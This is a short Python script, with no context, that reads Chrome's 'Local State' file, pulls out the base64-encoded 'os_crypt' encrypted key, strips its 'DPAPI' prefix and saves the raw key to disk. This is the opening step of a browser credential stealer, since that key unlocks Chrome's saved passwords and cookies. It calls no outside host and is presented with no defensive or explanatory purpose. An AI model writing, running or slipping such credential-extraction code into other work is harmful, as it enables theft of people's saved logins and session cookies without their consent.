import json
import base64

fh = open('AppData/Local/Google/Chrome/User Data/Local State', 'rb')
encrypted_key = json.load(fh)

encrypted_key = encrypted_key['os_crypt']['encrypted_key']

decoded_key = base64.b64decode(encrypted_key)

open("enc_key.dat",'wb').write(decoded_key[5:])
